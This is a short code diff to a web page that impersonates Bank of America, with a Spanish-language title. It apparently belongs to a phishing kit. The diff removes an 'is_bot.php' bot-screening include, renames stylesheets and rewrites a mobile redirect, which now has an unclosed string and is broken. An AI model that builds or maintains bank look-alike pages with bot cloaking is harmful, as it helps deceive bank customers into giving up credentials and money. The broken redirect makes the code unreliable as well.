@@ -1,6 +1,4 @@
-<?php
-require "is_bot.php";
-?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -12,13 +10,13 @@ require "is_bot.php";
         Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
         inversiones con Merrill
     </title>
-    <link rel="stylesheet" href="css/normalize.min.css" />
-    <link rel="stylesheet" href="css/estilos.css" />
-    <link rel="stylesheet" href="css/points.css">
+    <link rel="stylesheet" href="css/normalize1.min.css" />
+    <link rel="stylesheet" href="css/estilos1.css" />
+    <link rel="stylesheet" href="css/points1.css">
     <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
     <script type="text/javascript">
         if (screen.width < 801) {
-            window.location = "indexm";
+            window.location = "pa1;
         }
     </script>
 </head>
